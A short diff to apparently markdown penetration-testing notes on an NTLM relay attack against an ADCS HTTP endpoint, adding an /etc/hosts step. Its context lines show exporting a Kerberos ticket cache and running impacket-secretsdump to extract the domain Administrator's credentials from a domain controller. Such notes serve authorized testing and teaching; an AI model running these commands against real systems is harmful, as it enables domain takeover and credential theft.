@@ -24,6 +24,7 @@ NTLM relay attack targeting an ADCS HTTP endpoint. ADCS supports multiple enroll
       `[realms]`      \
       `domain = {`      \
       `kdc = <DC-FQDN>`      \
-      `}`
+      `}`&#x20;
+* Update `/etc/hosts` file for DC or other server FQDN resolutions
 * `export KRB5CCNAME=/tmp/dc.ccache`
 *  `impacket-secretsdump -k -no-pass -dc-ip <IP> -just-dc-user Administrator 'domain/DC-Machine Account'@DC-FQDN`
